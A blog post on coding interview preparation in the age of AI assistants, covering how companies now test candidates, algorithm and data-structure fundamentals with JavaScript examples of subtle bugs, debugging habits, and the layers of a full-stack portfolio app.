title: Coding Interview Prep When Agents Write the Code
partialText:
What interviews test now, and the fundamentals that still decide them

In January 2026, Anthropic explained why it had to redesign the take-home test it gives performance engineers: “When given the same time limit, Claude Opus 4 outperformed most human applicants. That still allowed us to distinguish the strongest candidates — but then Claude Opus 4.5 matched even those.” (Anthropic)

If a model can match the best candidates on a hiring test, what is the test for? And if you’re preparing for interviews now, what should you practice?

I’ve interviewed at FAANG and hired dozens of engineers, and I think the answer is fundamentals, which is also where the companies rewriting their interviews keep landing. What changed is how they get tested. Some interviews hand you an AI and watch whether you can tell when it’s wrong. Others take the AI away to see what you know without it. Both need the same knowledge.

The other thing that counts for more now is what you’ve built. An AI can generate an app in an afternoon, so having one matters less than being able to explain every part of it and why you built it that way. This post covers the fundamentals that still decide interviews, with examples, and then what to know about the systems you build.

Interviews split in two

Over the last year and a half, companies went in two directions at once.

Some let AI in. Canva now expects backend, machine learning, and frontend candidates “to use AI tools like Copilot, Cursor, and Claude during our technical interviews,” and its AI-assisted round “replaces our traditional Computer Science Fundamentals screening” (Canva, June 2025). In July 2025, Meta said it was developing “a new type of coding interview in which candidates have access to an AI assistant.” An internal post said the format “is more representative of the developer environment that our future employees will work in, and also makes LLM-based cheating less effective” (TechRadar). CoderPad, HackerRank, CodeSignal, and Karat, the platforms many companies run their interviews on, all sell AI-assisted interviews now.

Others took AI out of the room. Interview Coder, a $60-a-month tool built by a Columbia student, promised to be “invisible to all screen-recording softwares” while it fed candidates answers during remote interviews (CNBC). Amazon asks candidates to acknowledge they won’t use unauthorized tools. Google’s stated reason for going back in person was fundamentals. Sundar Pichai said Google would “introduce at least one round of in-person interviews for people just to make sure the fundamentals are there” (Lex Fridman Podcast, June 2025).

Google is doing both. In May 2026 it started piloting a round where candidates use Gemini to read, debug, and improve an existing codebase, and interviewers grade “prompt engineering, output validation, and debugging skills” (Entrepreneur, citing Business Insider).

Most companies now tell you which kind of round you’re in. Datadog runs AI-assisted coding interviews for some roles, and otherwise, “Unless explicitly stated otherwise, you should not use AI tools during live coding interviews or technical assessments” (Datadog). Anthropic’s guidance for live interviews is “This is all you–no AI assistance unless we indicate otherwise” (Anthropic). Expect to face both kinds.

What the AI rounds test

When an AI writes the first draft, the interview moves to everything around it. These are the formats companies describe:

  • Reading, debugging, and improving code you didn’t write. Google’s pilot works this way, and Canva asks it directly: “Can they identify and fix issues in AI-generated code?”
  • Solving a problem with an AI assistant while the interviewer watches how you prompt it and check its work.
  • Working across a multi-file project instead of a single function, as in Karat’s AI-assisted interviews.
  • Explaining your approach, including what the AI did and why you kept it.

CoderPad allows AI in its own interviews, and it lists what counts against you: “accepting every answer out of AI as correct, or being unable to explain your answers with depth and critical thinking” (CoderPad).

Canva says, “We’re still assessing computer science fundamentals through the new process.” In the AI round, you use your fundamentals to judge the code instead of to write it.

What I look for when I hire

When I hire, I look for strong fundamentals and a willingness to learn and try new technologies. Today that means someone who experiments with AI and pushes it to see where it works well and where it doesn’t, and who can tell which of its decisions hold up from first principles. I look for passion. I want people who build things for fun and who keep pushing themselves out of their comfort zone.

The best way to show all of that is to build. Make things, put them in a portfolio, and make sure you understand every part of them. Expect questions about any project you list: why you chose that database, how the login works, where the images are stored, and what would break first if a thousand people signed up tomorrow. With AI writing more of the code, those answers are how an interviewer tells someone who built a project from someone who generated one.

Build things, and understand the system

The AI rounds look a lot like real work: a codebase that already exists, more than one file, and questions about how the pieces fit together. I think the best preparation for that, and maybe the most important thing you can do for your career right now, is to build real projects and understand how they work from end to end.

A portfolio app should have every layer a real product has. Take a small app for splitting expenses with roommates:

  • A frontend where people sign up, create a group, add expenses, and see who owes whom.
  • An API that validates every request and checks that the person asking belongs to the group they’re asking about.
  • A database with tables for users, groups, and expenses, and indexes on the queries the app runs most.
  • Login, plus a way to reset a forgotten password.
  • Receipt photos in object storage instead of the database.
  • A background job that emails each group a weekly summary.
  • Logs and error tracking, so you find out something broke before your users tell you.

And it needs to be deployed at a live URL where anyone can sign up and use it. A repo with setup instructions or a demo video doesn’t show that the whole thing works. Bonus points if you have real users on it. Even a few friends using it every week will turn up bugs, slow pages, and confusing screens that no tutorial covers, and each one becomes a story you can tell in an interview.

Building is also where the fundamentals stop being interview trivia. The data structures in the next section run underneath every system you’ll work on:

  • Hash maps are behind caches like Redis, and behind every lookup by ID.
  • Database indexes are trees. PostgreSQL’s default index is a B-tree, which finds a row in a few steps instead of scanning the whole table.
  • Background jobs, like sending email or resizing images, wait in queues.
  • Graphs model social networks, package dependencies, and the routes in a maps app.
  • Node’s event loop keeps its timers in a heap, so it always knows which one fires next.
  • Big O is why a page that loads instantly with 100 rows times out with a million.

An AI will write any one of those pieces for you. Deciding which pieces a system needs, how they connect, and what each choice costs is system architecture and design. It’s what interviews ask about once they move past a single function, and it’s how you judge whether the code an AI wrote belongs where it put it.

The fundamentals come first, since the rest builds on them. Later in this post, I come back to building, with what to know at every layer of a project, from the frontend to hosting.

The fundamentals that matter more

In Stack Overflow’s 2025 survey, 66% of developers named “AI solutions that are almost right, but not quite” as their biggest frustration with AI tools (Stack Overflow 2025). In the 2026 survey, 48% said they trust AI output when they can easily verify it (Stack Overflow 2026). Checking whether code is right takes the same knowledge as writing it.

The sections below go in the order I’d learn them, which is also the order of Skilled.dev’s course: complexity first, then each data structure and the algorithms that use it, building up to dynamic programming. Most include code that looks right and passes a small test, but falls apart as the input grows or fails a case the test didn’t cover.

Big O notation and complexity

Big O describes how the work an algorithm does grows as its input grows. It counts steps instead of seconds, because seconds depend on the machine and the step count doesn’t. It keeps only the fastest-growing term and drops constants, so an algorithm that takes 3n + 5 steps is O(n). You’ll usually give two answers: time complexity, for the steps, and space complexity, for the extra memory the algorithm needs. Unless the interviewer asks otherwise, describe the worst case.

These are the classes that come up most:

  • O(1), constant: the work stays the same as the input grows, like reading an array by index or looking up a key in a hash map.
  • O(log n), logarithmic: the work goes up by one step each time the input doubles, like binary search on a sorted array.
  • O(n), linear: one pass over the input.
  • O(n log n): efficient sorting.
  • O(n²), quadratic: a loop over the input inside another loop over the input.
  • O(2ⁿ), exponential: trying every subset, or recursion that branches without remembering results.

Two-sum shows how much the choice matters. Given an array of numbers and a target, return the indexes of the two numbers that add up to the target. The brute-force answer checks every pair:

function twoSum(nums, target) {
  for (let i = 0; i < nums.length; i++) {
    for (let j = i + 1; j < nums.length; j++) {
      if (nums[i] + nums[j] === target) return [i, j];
    }
  }
  return null;
}

It’s correct, and on 10 numbers you’d never notice a problem. But for each number it scans the rest of the array, so it’s O(n²) time. On 100,000 numbers, that’s up to about 5 billion pairs. It doesn’t use any extra memory, so it’s O(1) space.

Sorting gives you a faster option. Once the numbers are sorted, start one pointer at the smallest number and one at the largest. If their sum is too small, move the left pointer right to get a bigger number. If it’s too big, move the right pointer left. Each step rules out one number, so the walk is O(n), and the sort before it is O(n log n), which makes the whole thing O(n log n). Sorting moves the numbers around, so to return their original indexes, sort pairs of value and index:

function twoSum(nums, target) {
  const sorted = nums.map((value, index) => ({ value, index }));
  sorted.sort((a, b) => a.value - b.value);
  let left = 0;
  let right = sorted.length - 1;
  while (left < right) {
    const sum = sorted[left].value + sorted[right].value;
    if (sum === target) return [sorted[left].index, sorted[right].index];
    if (sum < target) left++;
    else right--;
  }
  return null;
}

On 100,000 numbers, the sort takes about 1.7 million steps and the walk at most 100,000. Two things about sorting in JavaScript trip up people and AI-written code alike. sort() sorts the array in place, so sorting the caller's array would scramble the indexes you're supposed to return, which is why this version sorts a new array. And without a compare function, sort() compares numbers as strings, so [10, 9, 1, 100].sort() returns [1, 10, 100, 9]. Pass (a, b) => a - b to sort numbers.

A hash map is faster still. Walk the array once, and for each number, check whether the number you’d need to reach the target is already in the map:

function twoSum(nums, target) {
  const seen = new Map();
  for (let i = 0; i < nums.length; i++) {
    const needed = target - nums[i];
    if (seen.has(needed)) return [seen.get(needed), i];
    seen.set(nums[i], i);
  }
  return null;
}

Looking up a key in a hash map takes O(1) time on average, no matter how many keys it holds, so the whole function is O(n): one lookup per number, or about 100,000 on 100,000 numbers. It pays for that speed with memory, since the map can end up holding every number, which makes it O(n) space. Trading memory for time with a hash map is one of the most common improvements you’ll make in an interview, and one of the first things to look for when you review code.

A test with 10 numbers can’t tell these three apart, and Big O can. Skilled.dev’s lessons on Big O and logarithms cover the analysis, and Target Two Sum is the same problem, but it asks for every pair.

Choosing the right data structure

Every data structure makes some operations cheap and others expensive, so choosing one means deciding which operations your code does most. These costs are worth knowing by heart:

The rest of this section goes through them one at a time, starting with the ones you’ll use most. Skilled.dev also keeps a longer complexity reference that notes which costs are averages and which are worst cases.

Arrays and strings

Arrays store items next to each other in memory, which is why reading by index is O(1) and inserting at the front is O(n): everything after the new item has to shift over. Strings work like arrays of characters, and in JavaScript, Python, and Java they’re immutable, so every change creates a new string.

Many array and string problems come down to two patterns that turn an O(n²) scan into O(n). Two pointers, which you saw in two-sum, walk inward from both ends, or move through the array at different speeds. A sliding window keeps a running answer for a range of the array and updates it as the range moves, instead of recomputing it from scratch.

To find the largest sum of k numbers in a row, the brute-force approach adds up every window, which is O(n × k). A sliding window adds the number entering the window and subtracts the one leaving it:

function maxWindowSum(nums, k) {
  if (k > nums.length) return null;
  let sum = 0;
  for (let i = 0; i < k; i++) sum += nums[i];
  let best = sum;
  for (let i = k; i < nums.length; i++) {
    sum += nums[i] - nums[i - k];
    best = Math.max(best, sum);
  }
  return best;
}

That’s O(n) time and O(1) space. The first line handles an edge case: if the array is shorter than k, there’s no window at all, and without the check the function returns NaN. Skilled.dev has guides to two pointers and sliding windows, and Palindromes, Permutations, Anagrams applies them to strings.

Hash maps

Hash maps are the data structure you’ll reach for most often in interviews, so it’s worth knowing how they work.

A hash map stores key-value pairs in an array of slots called buckets. A hash function turns each key into a number, and that number picks the bucket, so finding a key means hashing it and going straight to one bucket instead of searching every entry. Sometimes two keys land in the same bucket, which is called a collision. Implementations handle collisions by keeping a short list in each bucket or by checking the next open slot. When the map fills up past a set point, it allocates a bigger array and moves every entry over. That one insert costs O(n), but it happens rarely enough that inserts still average O(1). In the worst case, when many keys collide, lookups slow to O(n), which is why the precise answer is “O(1) on average.”

Reach for a hash map when a problem asks one of these questions:

  • Have I seen this before? Finding duplicates, or two-sum’s check for the number you need.
  • How many of each? Counting the letters in two strings to see whether they’re anagrams.
  • Which ones belong together? Grouping anagrams by using each word’s sorted letters as the key.
  • Have I already computed this? Caching results, which is memoization, covered below.
  • Where’s the record with this ID? Looking records up by key instead of searching a list.

The last one shows up constantly in application code, including code an AI writes. This attaches a user to each order by searching the users array:

for (const order of orders) {
  order.user = users.find((user) => user.id === order.userId);
}

find() scans the array, so this is O(orders × users). With 10,000 orders and 10,000 users, that's up to 100 million comparisons. Building a map of users by ID first makes it O(orders + users):

const usersById = new Map(users.map((user) => [user.id, user]));
for (const order of orders) {
  order.user = usersById.get(order.userId);
}

Hash maps have costs too. They use extra memory. They don’t keep keys in sorted order, so if you need the smallest key or every key in a range, use a sorted array, a heap, or a tree. JavaScript’s Map remembers the order you inserted keys, which isn't the same as sorted order. And in JavaScript, plain object keys are always strings, so obj[1] and obj["1"] are the same key, while a Map keeps 1 and "1" separate. Use a Map when keys aren't strings or when you add and remove keys often, and a Set when you only need to know whether something is there. See Skilled.dev's lessons on hash tables and implementing a hash table from scratch.

Recursion

A recursive function solves a problem by calling itself on a smaller version of it. It needs a base case, where it returns an answer without recursing, and a recursive case that moves toward the base case. Summing the digits of a number is a small example:

function sumDigits(n) {
  if (n < 10) return n;
  return (n % 10) + sumDigits(Math.floor(n / 10));
}

sumDigits(1234) returns 4 plus sumDigits(123), which returns 3 plus sumDigits(12), and so on until one digit is left. Each call removes one digit, so for a number with d digits it's O(d) time.

Each call also waits on the call stack until the calls it made return, so recursion uses O(depth) memory even when it creates no data. In Node, the stack runs out at around 10,000 nested calls, and you get “Maximum call stack size exceeded.” Any recursive function can be rewritten as a loop with your own stack, which is the fix when the input can get that deep.

Recursion fits problems that contain smaller copies of themselves, which is why it comes back in sorting, trees, graphs, and dynamic programming. See the recursion lesson and Sum Digits, which asks you to do this without converting the number to a string.

Sorting and binary search

Most languages’ built-in sorts are O(n log n), and it’s worth knowing two of the algorithms behind that. Merge sort splits the array in half, sorts each half recursively, and merges the sorted halves. It’s O(n log n) every time, and it keeps equal items in their original order, which makes it a stable sort. Quicksort picks a pivot, moves smaller items to one side and larger items to the other, and recurses on each side. It’s O(n log n) on average and fast in practice, but O(n²) if the pivots keep landing near the smallest or largest item. You’ll rarely write either in an interview, but you should be able to explain why sorting costs O(n log n) and when sorting first makes a problem easier.

The biggest reason to sort is binary search. On a sorted array, check the middle item, and throw away the half that can’t contain the target:

function binarySearch(sorted, target) {
  let lo = 0;
  let hi = sorted.length - 1;
  while (lo <= hi) {
    const mid = Math.floor((lo + hi) / 2);
    if (sorted[mid] === target) return mid;
    if (sorted[mid] < target) lo = mid + 1;
    else hi = mid - 1;
  }
  return -1;
}

Each step halves what’s left, so it’s O(log n): 20 steps for a million items. hi starts at the last index and is inclusive, so the loop runs while lo <= hi. Most binary search bugs come from mixing that up with a version where hi is exclusive.

Binary search works on more than arrays of numbers. Whenever the answer to a yes-or-no question flips once, from no to yes, as the input grows, you can binary search for where it flips. That’s how First Bad Version works. See the lessons on searching and binary search and sorting, and try Shifted Search, which runs binary search on a sorted array that’s been rotated.

Linked lists, stacks, and queues

A linked list stores each value in a node that points to the next node. Adding or removing a node you already have is O(1), since only the pointers change, but reaching the nth node means walking n steps. Linked list problems mostly test whether you can move pointers without losing part of the list. Reversing one is the classic:

function reverse(head) {
  let prev = null;
  let node = head;
  while (node) {
    const next = node.next;
    node.next = prev;
    prev = node;
    node = next;
  }
  return prev;
}

Save next before you change node.next, or you lose the rest of the list. It's O(n) time and O(1) space.

Stacks and queues are about order. A stack is last in, first out, like a stack of plates, and it fits any problem where the most recent thing you opened has to close first, like undo, nested function calls, and matching brackets:

const PAIRS = { ')': '(', ']': '[', '}': '{' };
function isBalanced(s) {
  const stack = [];
  for (const char of s) {
    if (char === '(' || char === '[' || char === '{') stack.push(char);
    else if (char in PAIRS && stack.pop() !== PAIRS[char]) return false;
  }
  return stack.length === 0;
}

Each character is pushed or popped at most once, so it’s O(n). A queue is first in, first out, like a line at a store. You’ll use one for breadth-first search in the graphs section, and in real apps, for background jobs.

Real systems combine these structures. An LRU cache, which evicts whatever was used least recently, pairs a hash map for O(1) lookups with a doubly linked list for O(1) reordering. See Reverse a Linked List, Valid Brackets, and the lessons on linked lists, stacks, and queues.

Trees

A tree is made of nodes, where each node can have children and every node except the root has exactly one parent. In a binary tree, each node has at most two children. You can walk a tree depth-first, going all the way down one branch before backing up, or breadth-first, one level at a time with a queue. Depth-first has three orders, pre-order, in-order, and post-order, which differ in whether you visit a node before, between, or after its children.

A binary search tree adds a rule: every value in a node’s left subtree is smaller than the node, and every value in its right subtree is larger. That makes find, add, and remove O(log n), as long as the tree stays balanced. Insert 1,000 numbers in sorted order into a plain binary search tree, and each one goes to the right of the last, so the tree becomes a chain 1,000 nodes deep and every operation becomes O(n). Self-balancing trees, like red-black trees, rearrange nodes to prevent that, and B-trees, a wider relative, are how most relational databases index their tables.

The binary search tree rule is also easy to check incorrectly. The obvious approach compares each node with its children:

function isValidBST(node) {
  if (!node) return true;
  if (node.left && node.left.value >= node.value) return false;
  if (node.right && node.right.value <= node.value) return false;
  return isValidBST(node.left) && isValidBST(node.right);
}

Every parent and child in this tree pass that check:

15 is greater than 5, so it’s a fine right child of 5. But it’s in 10’s left subtree, where every value has to be less than 10, so this isn’t a binary search tree, and the function returns true anyway. Each node has to fit the range set by all of its ancestors, so the fix carries a minimum and maximum down the tree:

function isValidBST(node, min = -Infinity, max = Infinity) {
  if (!node) return true;
  if (node.value <= min || node.value >= max) return false;
  return isValidBST(node.left, min, node.value) && isValidBST(node.right, node.value, max);
}

An in-order walk of a valid binary search tree visits the values in sorted order, which gives you a second way to check one. See Tree Traversal, Binary Search Trees, Binary Tree Max Depth, and BST Validate.

Graphs

A graph is a set of nodes connected by edges. Edges can be directed, like follows on a social network, or undirected, like friendships, and they can carry weights, like the distance between two cities. A tree is a graph with no cycles. Interview graphs are usually stored as an adjacency list, a map from each node to its neighbors, which takes O(V + E) space, where V is the number of nodes and E is the number of edges.

Depth-first search goes as deep as it can before backing up, using recursion or a stack. It fits questions like whether two nodes are connected, how many separate groups there are, or whether there’s a cycle. Breadth-first search explores one level at a time with a queue, so the first time it reaches a node is along the fewest edges, which makes it the tool for shortest paths when edges have no weights. With non-negative weights, Dijkstra’s algorithm does the same job with a heap. Both searches keep a visited set, because a graph, unlike a tree, can lead you back to a node you’ve already seen, and without the set you’d loop forever.

The queue is where a common JavaScript bug hides. The quick way to write one is an array with shift():

function bfs(graph, start) {
  const visited = new Set([start]);
  const queue = [start];
  while (queue.length > 0) {
    const node = queue.shift();
    for (const next of graph[node]) {
      if (!visited.has(next)) {
        visited.add(next);
        queue.push(next);
      }
    }
  }
  return visited;
}

Breadth-first search should be O(V + E), since it handles each node and edge once. But shift() removes the first element of an array by moving every element after it forward one slot, so it's O(n), and on a large graph the search becomes O(V²). On a tree with 111,111 nodes where every node has 10 children, the queue holds up to 100,000 nodes at once, and the shift() calls can move about 5.6 billion elements in total. JavaScript engines have tricks that make shift() cheap on small arrays, so a small test looks fine.

The fix is to stop removing items and read the array with an index instead: const node = queue[head++], looping while head < queue.length. Each read is O(1), so the search is O(V + E) again. A linked list or a ring buffer gives you an O(1) queue too. See Graphs, Depth-First Search, Breadth-First Search, and Count Islands, and compare the two searches in Skilled.dev's BFS vs. DFS guide.

Dynamic programming

Dynamic programming is recursion that remembers its answers. The textbook recursive Fibonacci shows why it needs to:

function fib(n) {
  if (n < 2) return n;
  return fib(n - 1) + fib(n - 2);
}

Each call makes two more calls, so the call tree branches at every level and the work grows exponentially. The usual answer is O(2ⁿ). The tighter bound is about O(1.6ⁿ), because one branch is shorter than the other: each time n goes up by one, the number of calls grows about 1.6 times. fib(30) makes 2.7 million calls, and fib(45) makes 3.7 billion. Most of that work is repeated. Computing fib(45) computes fib(2) 701 million times. The space is only O(n), since the call stack never gets deeper than n calls.

If you store each result the first time you compute it, every value gets computed once:

function fib(n, memo = new Map()) {
  if (n < 2) return n;
  if (memo.has(n)) return memo.get(n);
  const result = fib(n - 1, memo) + fib(n - 2, memo);
  memo.set(n, result);
  return result;
}

That’s memoization. fib(45) now makes 89 calls, and the function is O(n) time and O(n) space, for the cache and the call stack.

You can also skip the recursion and build up from the base cases with a loop, which is called the bottom-up approach. Each Fibonacci number needs only the two before it, so you only have to keep two:

function fib(n) {
  let prev = 0;
  let curr = 1;
  for (let i = 0; i < n; i++) {
    [prev, curr] = [curr, prev + curr];
  }
  return prev;
}

That’s O(n) time and O(1) space, with no call stack to overflow.

Most dynamic programming problems follow the same steps. Define what a subproblem is, write how a bigger answer comes from smaller ones, and check whether the same subproblems repeat. If they do, cache them or build the answers from the bottom up. Skilled.dev covers each step in Subproblems and Overlapping Subproblems, Memoization, and Bottom-Up vs. Top-Down.

Checking, debugging, and explaining code

The fundamentals tell you what correct, efficient code looks like. The AI rounds also grade the skills around the code: catching the case nobody tested, finding a bug, and explaining why you kept what you kept.

Edge cases

The binary search tree bug above passed the obvious test and failed a case nobody tried. Before you call a solution done, whether you or an AI wrote it, check it against these:

  • Empty input, and input with one element.
  • Duplicates, negative numbers, and zero.
  • Input that’s already sorted, sorted in reverse, or all the same value.
  • The first and last positions, where off-by-one errors happen. Write binary search with while (lo < hi) and an inclusive hi, and it never checks the last element.
  • null, undefined, and missing fields.
  • Very large numbers. JavaScript numbers lose precision past Number.MAX_SAFE_INTEGER, about 9 quadrillion, and the 79th Fibonacci number is already past it, so use BigInt there. In Java or C++, adding two large ints can overflow.
  • Very large input, which is where the complexity shows up.

Reading code and debugging

When I built a coding agent from scratch, I gave it a script that should have printed 20 and didn’t. A 9-billion-parameter model rewrote the script, ran it, and got 15. It rewrote it again and got 15 again. Then it wrote a debug script to test its own assumption, found that Number(null) returns 0 and not NaN as it expected, and fixed the bug. The agent and the broken script, average.js, are on GitHub if you want to find the bug yourself.

That’s the habit to practice: when the output is wrong, make a guess, and write the smallest test that proves or disproves it. As steps:

  1. Reproduce the bug so it fails every time.
  2. Shrink the input to the smallest case that still fails.
  3. Guess the cause, and decide what you’d see if the guess were right.
  4. Check the guess with the smallest test you can, like a log line, an assertion, or a breakpoint.
  5. Fix it, and add a test that would have caught it.

Even then, the code the agent left behind had a check, Number(score) !== null, that is always true. The output was right, and the code still had a mistake that only a careful reader would catch.

When you review code an AI wrote, look for:

  • Conditions that are always true or always false, like that !== null check.
  • The edge cases from the checklist above.
  • Hidden loops. A find(), includes(), or indexOf() inside a loop makes it a nested loop.
  • Changes you didn’t ask for. Read the whole diff, including the parts you didn’t expect it to touch.
  • Functions, packages, or options that don’t exist. Models sometimes invent them, and the error shows up only when that line runs.
  • Errors that get caught and ignored, like an empty catch block.
  • Tests that only check a mock, or that were written to match the code’s output instead of what the code is supposed to do.

Leaning on AI can weaken this skill. In a randomized trial Anthropic published in January 2026, people learning a new Python library with AI help scored 50% on a quiz afterward, against 67% for people who coded by hand. “The largest gap in scores between the two groups was on debugging questions” (Anthropic). Debugging is also the skill the AI rounds grade.

Explaining your solution

The AI rounds add a question to every solution: why did you accept what the AI wrote? Datadog tells candidates to be prepared to “explain your approach, including how and why you used AI in your process.” Explaining a tradeoff out loud uses the same skill as writing a clear prompt, since both need you to know what you want and why. Sean Goedecke put it this way: “The most important skill in prompting is expertise in the domain you’re prompting for” (seangoedecke.com).

The same structure works whether or not an AI wrote the first draft:

  1. Restate the problem, and ask about the input. How big can it get? Can it be empty? Can it have duplicates or negative numbers?
  2. Describe the brute-force solution and its complexity, even if you don’t write it.
  3. Say what makes it slow and how to fix it, like replacing an inner loop with a hash map lookup.
  4. Write the code, or walk through the AI’s code, saying what each part does.
  5. Trace an example and the edge cases through it.
  6. Give the final time and space complexity, and the tradeoff you made.

Skilled.dev has a guide on explaining your interview solution.

What to know about the things you build

Back to building. You don’t need to be an expert at every layer of an app, but you should be able to follow a request through all of them and explain what you chose at each one, what else you considered, and what you gave up.

The frontend

React builds the page from components, keeps state in the browser, and has the largest ecosystem of any frontend library, so most problems you hit have been solved before. The cost is the JavaScript the browser downloads and runs before the page works, plus decisions about routing, data fetching, and rendering that React leaves to you.

Next.js is a framework on top of React that makes those decisions. It adds routing based on your files, and it can render pages on the server, at build time, or in the browser, which helps first load time and search engines. React Server Components let parts of the page run only on the server, where they can read the database directly and send no JavaScript. The cost is more concepts to learn, like which code runs where and how caching works. It runs anywhere Node runs, but some features work most smoothly on Vercel, the company behind it.

HTMX takes a different approach. The server returns HTML, and attributes on your elements swap parts of the page when the user clicks or submits a form, so you write very little JavaScript and can use any backend language. It’s a good fit for forms, dashboards, and admin tools, and a poor fit for very interactive interfaces, like an editor or a drag-and-drop board, where most of the state lives in the browser.

Whatever you pick, know where your state lives, what renders on the server and what renders in the browser, and what the user sees while data loads or when a request fails.

The API

REST organizes the API around resources and HTTP methods, so GET /orders/42 reads an order and POST /orders creates one. It's simple, every tool supports it, and HTTP caching works with it out of the box. The cost is that each endpoint returns a fixed shape, so clients often get more data than they need, or make several requests to build one page.

GraphQL exposes one endpoint, and the client asks for exactly the fields it wants, across related data, in a single request. That helps when several clients, like a web app and a mobile app, need different shapes of the same data. The costs land on the server. Caching is harder, since requests usually go to one URL as a POST. One query can ask for a huge amount of data, so you need limits. And a naive resolver runs a database query for every item in a list, which is called the N+1 problem.

RPC means calling server functions by name. tRPC does this for TypeScript apps, so the frontend calls backend functions with full type checking and no separate schema, but both ends have to be TypeScript. gRPC sends Protocol Buffers over HTTP/2 and is common between backend services, where it’s fast and strictly typed, but browsers can’t call it directly without a proxy.

For any of them, know how you validate input, return errors, page through long lists, and change the API without breaking clients that already use it.

The database

Relational databases like PostgreSQL and MySQL store data in tables with a schema. You can join tables, constraints keep bad data out, and transactions make a group of changes succeed or fail together. PostgreSQL is a safe default for most apps.

MongoDB stores JSON-like documents without a fixed schema. It’s quick to start with and fits data you always read as one piece. The cost shows up when your data has relationships: joins are weaker, and the rules you didn’t put in a schema end up in your application code.

Redis keeps data in memory, which makes it very fast. It’s the usual choice for caching, sessions, rate limits, and job queues, and it shouldn’t be the only copy of data you can’t afford to lose.

SQLite is a whole database in one file inside your app, with no server to run. It’s great for small apps, local tools, and prototypes, and services like Cloudflare D1 and Turso run it in production. It handles one write at a time, so it doesn’t fit apps with many servers writing heavily at once.

Know which queries your app runs most and which indexes make them fast, what happens when two requests change the same row at the same time, and how you change the schema with migrations once there’s real data in it.

Authentication and authorization

Authentication checks who someone is. Authorization checks what they’re allowed to do. A common security bug gets the first right and forgets the second, like checking that a user is logged in but not that the order they’re editing belongs to them.

With sessions, the server stores a record of the login and gives the browser a cookie with its ID, so logging someone out means deleting the record. With JSON Web Tokens, or JWTs, the server signs a token that contains the user’s ID, and any server can verify it without a database lookup. That’s convenient across services, but you can’t easily revoke a token before it expires, so keep them short-lived. Store tokens in httpOnly cookies, which scripts on the page can't read, instead of localStorage, where an injected script can steal them.

“Sign in with Google” uses OAuth and OpenID Connect. If you store passwords yourself, hash them with an algorithm built for passwords, like bcrypt or Argon2, and never store them in plain text. Services like Auth0, Clerk, Supabase Auth, and Firebase Authentication handle all of this for you, which is often the right call, but you still need to be able to explain how the flow works.

Files and images

Keep uploads and images out of your database. Put them in object storage, like Amazon S3, Cloudflare R2, or Google Cloud Storage, and save each file’s key in the database. For uploads, your server can hand the browser a presigned URL, a short-lived link that lets it upload straight to storage without the file passing through your server. Serve files through a CDN so they load from a server near each user. Know who’s allowed to read each file, and what happens to a file when the record that points to it is deleted.

Hosting and deployment

Platforms like Vercel and Netlify deploy when you push to git and run your backend as serverless functions. You don’t manage servers, and it’s cheap at low traffic. The costs are cold starts, limits on how long a request can run, poor support for long-lived connections like WebSockets, and bills that can climb quickly with traffic.

A long-running server in a container, on Fly.io, Render, Railway, or AWS, handles WebSockets, background workers, and steady traffic, usually at a more predictable cost. In exchange, you handle more yourself, like health checks, scaling, and deploys.

Edge platforms like Cloudflare Workers run your code in data centers close to each user, so responses start fast everywhere. The runtime is more limited than Node, and if your database sits in one region, every query still travels there.

Managed databases like Neon, Supabase, and Amazon RDS handle backups and upgrades for you. Wherever you host, know where your secrets are stored, how a commit gets to production, how you roll back a bad deploy, and where you look first when something breaks.

The whole system

Be able to follow one request from start to finish. The browser looks up your domain through DNS, a CDN returns anything it has cached, your server checks who the user is and whether they’re allowed to do this, it reads or writes the database, and the page renders the response.

Then know what you’d add as the app grows. Slow work, like sending email or processing video, goes to a background job queue so the request can return right away. A cache like Redis in front of expensive queries takes load off the database. Logs, error tracking, and metrics tell you what’s happening in production. And know what breaks first at 10 or 100 times the traffic, whether that’s the database, one slow endpoint, or an API you depend on.

Understand what you built

AI makes it easy to ship a project you couldn’t rebuild. Before you put one in your portfolio:

  • Read every file, and be able to explain what each one does.
  • Pick one part, like the login flow or an API endpoint, and rebuild it without AI.
  • Write a README that explains the architecture, what you chose at each layer, what you considered, and what you’d change.
  • Deploy it at a live URL, so people can use it and an interviewer can click through it.
  • Practice answering “Why did you build it this way?” for every layer above.

If you want a real full-stack codebase to read, Skilled.dev’s is open source. It has a Next.js frontend with lessons written in MDX, a GraphQL API from Hasura over Postgres, and a code runner that runs each submission in a throwaway Docker container (GitHub).

What matters less

Memorizing solutions matters less. An AI can recall the answer to any well-known problem, so recognizing which pattern a new problem needs is worth more than remembering the answer to an old one. Syntax and boilerplate matter less too.

Algorithm questions haven’t gone away, though. In a September 2025 survey by interviewing.io, “Of the 52 respondents from FAANG, ZERO said that their company has moved away from algorithmic questions,” though 58% said they had changed the questions they ask (interviewing.io). In Karat’s January 2026 survey of 400 engineering leaders, 62% said their organizations still prohibit AI in technical interviews (Karat). Those are the latest surveys I could find, and 2026 has moved fast, but big companies still run at least one round that checks fundamentals without AI.

Where interviews are going

This is my guess, based on what companies have announced so far.

Both kinds of rounds will stay. AI-assisted rounds will spread, because they match how the job works and they make hidden AI help pointless. Companies will still keep at least one round without AI, because they need to know what you can do when the AI is wrong. Google already runs both.

More interviews will start from existing code. You’ll be asked to find the bug, add the feature, or make it faster when the input grows. Google’s pilot works this way, and candidates describe Meta’s AI round the same way.

Algorithm questions will stay in the round without AI, but they’ll be harder to memorize. Expect to modify and explain a solution more often than recite one.

Take-homes will either allow AI and get harder, or disappear. Anthropic’s new take-home lets candidates use AI “as they would on the job,” with longer problems that are “harder for AI to solve completely.”

What you’ve built will count for more. Felix Rieseberg, a hiring manager at Anthropic, stopped giving coding interviews to his team: “There’s no more point in giving you a little React challenge than there is in quizzing people about assembly; Claude is now better at both.” He now scans “resumes and portfolios for little prototypes that exhibit taste, empathy, and principled thinking” (felixrieseberg.com). That’s one manager’s choice and not Anthropic’s policy, but it matches what I look for: people who build for fun.

How to prepare now

  • Solve the problem yourself first, then ask an AI to review your solution. In Anthropic’s trial, the people who handed everything to the AI scored under 40%. Those groups had only 2 to 7 people each, so treat it as a warning sign.
  • Read code before you run it. Take an AI’s solution to a problem you know, and find the bug or the slow part before you run the tests.
  • Use AI as a tutor. Ask it for a hint, a counterexample, or a quiz instead of the answer.
  • State the time and space complexity of everything you write and everything the AI writes, then test it on 100,000 items as well as 10.
  • Explain out loud, including what the AI wrote and why you kept it.
  • Practice with AI and without it, since you’ll likely face both rounds.
  • Build a full-stack project, deploy it, and make sure you can explain every layer.

Here are two schedules that put those habits to work, depending on how much time you have. Both follow the order of the fundamentals above and run a project alongside them. Skilled.dev breaks the fundamentals down day by day in its 30-day and 90-day plans.

A 30-day plan

